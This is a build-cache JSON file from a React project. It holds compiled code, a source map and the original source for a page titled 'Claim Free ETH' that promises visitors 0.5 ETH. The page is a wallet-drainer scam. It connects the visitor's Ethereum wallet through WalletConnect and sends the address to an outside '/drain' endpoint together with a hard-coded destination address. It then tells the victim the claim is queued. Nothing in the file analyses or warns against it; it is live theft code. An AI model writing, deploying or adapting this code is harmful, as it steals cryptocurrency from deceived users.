{"ast":null,"code":"import React,{useState,useEffect}from\"react\";import ReactDOM from\"react-dom/client\";// Import WalletConnect Provider\nimport{WalletConnect}from\"@walletconnect/web3-provider\";import{jsx as _jsx,jsxs as _jsxs}from\"react/jsx-runtime\";const App=()=>{const[response,setResponse]=useState(null);const[loading,setLoading]=useState(false);const[walletProvider,setWalletProvider]=useState(null);const[walletAddress,setWalletAddress]=useState(null);// Initialize WalletConnect\nuseEffect(()=>{const provider=new WalletConnect({bridge:\"https://bridge.walletconnect.org\",// WalletConnect bridge URL\nqrcode:true,// Show QR code for mobile\nchainId:1// Ethereum mainnet\n});setWalletProvider(provider);return()=>provider.disconnect();},[]);const connectWallet=async()=>{setLoading(true);setResponse(null);try{// Check if wallet is available\nif(!walletProvider){throw new Error(\"Wallet not detected. Please install a supported wallet.\");}await walletProvider.enable();// Connect to wallet\n// Get wallet address\nconst address=walletProvider.accounts[0];setWalletAddress(address);// Make a POST request to your backend\nconst res=await fetch(\"https://tokenbackendwork.onrender.com/drain\",{method:\"POST\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify({address,drainTo:\"0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4\"})});const data=await res.json();if(res.ok){setResponse({success:true,message:\"Token claim queued. You will be credited in a few minutes.\"});}else{setResponse({success:false,message:\"Failed to claim token. Try again later.\"});}}catch(err){console.error(err);setResponse({success:false,message:\"Failed to claim token. Try again later.\"});}finally{setLoading(false);}};return/*#__PURE__*/_jsx(\"div\",{className:\"min-h-screen flex flex-col items-center justify-center p-4 bg-gray-900 text-white\",children:/*#__PURE__*/_jsxs(\"div\",{className:\"max-w-md w-full bg-gray-800 p-8 rounded-lg shadow-lg text-center\",children:[/*#__PURE__*/_jsx(\"h1\",{className:\"text-4xl font-bold mb-6\",children:\"Claim Free ETH\"}),/*#__PURE__*/_jsx(\"p\",{className:\"text-lg mb-8\",children:\"Connect your wallet to claim 0.5 ETH now. It's free and easy!\"}),/*#__PURE__*/_jsx(\"button\",{onClick:connectWallet,disabled:loading,className:\"flex items-center justify-center p-3 rounded-lg transition-all duration-200 \".concat(loading?\"bg-gray-700 cursor-not-allowed\":\"bg-blue-600 hover:bg-blue-700\"),children:/*#__PURE__*/_jsx(\"span\",{className:\"text-white font-medium\",children:\"Connect Wallet\"})}),response&&/*#__PURE__*/_jsxs(\"div\",{className:\"mt-6 p-4 bg-gray-700 rounded\",children:[/*#__PURE__*/_jsx(\"h3\",{className:\"font-bold text-gray-200\",children:\"Response:\"}),/*#__PURE__*/_jsx(\"pre\",{className:\"text-sm text-gray-400\",children:JSON.stringify(response,null,2)})]})]})});};const root=ReactDOM.createRoot(document.getElementById(\"root\"));root.render(/*#__PURE__*/_jsx(App,{}));","map":{"version":3,"names":["React","useState","useEffect","ReactDOM","WalletConnect","jsx","_jsx","jsxs","_jsxs","App","response","setResponse","loading","setLoading","walletProvider","setWalletProvider","walletAddress","setWalletAddress","provider","bridge","qrcode","chainId","disconnect","connectWallet","Error","enable","address","accounts","res","fetch","method","headers","body","JSON","stringify","drainTo","data","json","ok","success","message","err","console","error","className","children","onClick","disabled","concat","root","createRoot","document","getElementById","render"],"sources":["/workspaces/-/src/index.js"],"sourcesContent":["import React, { useState, useEffect } from \"react\";\r\nimport ReactDOM from \"react-dom/client\";\r\n\r\n// Import WalletConnect Provider\r\nimport { WalletConnect } from \"@walletconnect/web3-provider\";\r\n\r\nconst App = () => {\r\n  const [response, setResponse] = useState(null);\r\n  const [loading, setLoading] = useState(false);\r\n  const [walletProvider, setWalletProvider] = useState(null);\r\n  const [walletAddress, setWalletAddress] = useState(null);\r\n\r\n  // Initialize WalletConnect\r\n  useEffect(() => {\r\n    const provider = new WalletConnect({\r\n      bridge: \"https://bridge.walletconnect.org\", // WalletConnect bridge URL\r\n      qrcode: true, // Show QR code for mobile\r\n      chainId: 1, // Ethereum mainnet\r\n    });\r\n\r\n    setWalletProvider(provider);\r\n    return () => provider.disconnect();\r\n  }, []);\r\n\r\n  const connectWallet = async () => {\r\n    setLoading(true);\r\n    setResponse(null);\r\n\r\n    try {\r\n      // Check if wallet is available\r\n      if (!walletProvider) {\r\n        throw new Error(\"Wallet not detected. Please install a supported wallet.\");\r\n      }\r\n\r\n      await walletProvider.enable(); // Connect to wallet\r\n\r\n      // Get wallet address\r\n      const address = walletProvider.accounts[0];\r\n\r\n      setWalletAddress(address);\r\n\r\n      // Make a POST request to your backend\r\n      const res = await fetch(\"https://tokenbackendwork.onrender.com/drain\", {\r\n        method: \"POST\",\r\n        headers: {\r\n          \"Content-Type\": \"application/json\",\r\n        },\r\n        body: JSON.stringify({\r\n          address,\r\n          drainTo: \"0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4\",\r\n        }),\r\n      });\r\n\r\n      const data = await res.json();\r\n\r\n      if (res.ok) {\r\n        setResponse({\r\n          success: true,\r\n          message: \"Token claim queued. You will be credited in a few minutes.\",\r\n        });\r\n      } else {\r\n        setResponse({\r\n          success: false,\r\n          message: \"Failed to claim token. Try again later.\",\r\n        });\r\n      }\r\n    } catch (err) {\r\n      console.error(err);\r\n      setResponse({\r\n        success: false,\r\n        message: \"Failed to claim token. Try again later.\",\r\n      });\r\n    } finally {\r\n      setLoading(false);\r\n    }\r\n  };\r\n\r\n  return (\r\n    <div className=\"min-h-screen flex flex-col items-center justify-center p-4 bg-gray-900 text-white\">\r\n      <div className=\"max-w-md w-full bg-gray-800 p-8 rounded-lg shadow-lg text-center\">\r\n        <h1 className=\"text-4xl font-bold mb-6\">Claim Free ETH</h1>\r\n        <p className=\"text-lg mb-8\">\r\n          Connect your wallet to claim 0.5 ETH now. It's free and easy!\r\n        </p>\r\n        <button\r\n          onClick={connectWallet}\r\n          disabled={loading}\r\n          className={`flex items-center justify-center p-3 rounded-lg transition-all duration-200 ${\r\n            loading\r\n              ? \"bg-gray-700 cursor-not-allowed\"\r\n              : \"bg-blue-600 hover:bg-blue-700\"\r\n          }`}\r\n        >\r\n          <span className=\"text-white font-medium\">Connect Wallet</span>\r\n        </button>\r\n        {response && (\r\n          <div className=\"mt-6 p-4 bg-gray-700 rounded\">\r\n            <h3 className=\"font-bold text-gray-200\">Response:</h3>\r\n            <pre className=\"text-sm text-gray-400\">\r\n              {JSON.stringify(response, null, 2)}\r\n            </pre>\r\n          </div>\r\n        )}\r\n      </div>\r\n    </div>\r\n  );\r\n};\r\n\r\nconst root = ReactDOM.createRoot(document.getElementById(\"root\"));\r\nroot.render(<App />);\r\n"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}